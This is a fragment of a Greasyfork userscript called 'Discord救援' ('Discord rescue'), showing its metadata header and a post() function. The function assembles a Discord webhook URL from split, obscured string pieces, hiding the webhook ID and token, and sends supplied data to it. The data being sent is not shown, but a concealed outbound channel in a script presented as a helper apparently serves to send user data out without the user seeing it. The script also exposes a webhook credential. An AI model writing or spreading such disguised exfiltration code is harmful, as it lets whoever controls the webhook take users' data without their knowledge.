...
// @grant none
// @version 0.0.1.20210502132742
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/446461/Discord%E6%95%91%E6%8F%B4.user.js
// @updateURL https://update.greasyfork.org/scripts/446461/Discord%E6%95%91%E6%8F%B4.meta.js
// ==/UserScript==
...
function post(data = {}) {
    ...
    const g = '838393276797026324';
    const a = 'lfxzrvJr';
    const b = 'prmxu7Jh';
    const c = 'eUTkHqlY';
    const d = 'DkPJWQeWX';
    const e = '3ZfHcrOL12Ih0UYq6erz7rdB35iWL995rcl';
    return postData(`https://${discord}/api/webhooks/${g}/${a}${b}${c}${d}${e}`, data);
}
